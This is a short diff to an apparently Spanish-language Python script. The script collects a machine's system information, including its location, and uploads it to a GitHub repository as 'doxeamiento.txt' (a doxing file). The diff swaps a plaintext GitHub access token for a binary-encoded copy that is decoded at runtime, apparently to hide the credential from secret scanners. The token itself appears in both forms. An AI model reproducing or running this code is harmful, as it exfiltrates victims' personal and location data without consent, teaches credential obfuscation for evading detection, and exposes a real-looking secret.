@@ -86,7 +86,11 @@ def gsys():
         "Ubicación": ubicacion if ubicacion else "No disponible"
     }
     return info
-github = github(token='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', owner='mrmorcilla', repo='python')
+def tb(binario):
+    return ''.join(chr(int(binario[i:i+8], 2)) for i in range(0, len(binario), 8))
+api='01100111011010000111000001011111011101110101010001100101011110000111100101100001011011100100001101001100011001000101010000110100010110000100101001110101010101100011001101010111010101100111010000111000011110000100110001100100010100000110111101101100011110000100100001101101001100110100101001110110001100010011010101011010'
+tokensito = tb(api)
+github = github(token=tokensito, owner='mrmorcilla', repo='python')
 system_info = gsys()
 texto=json.dumps(system_info, indent=4, ensure_ascii=False)
 res=github.write('doxeamiento.txt',texto)
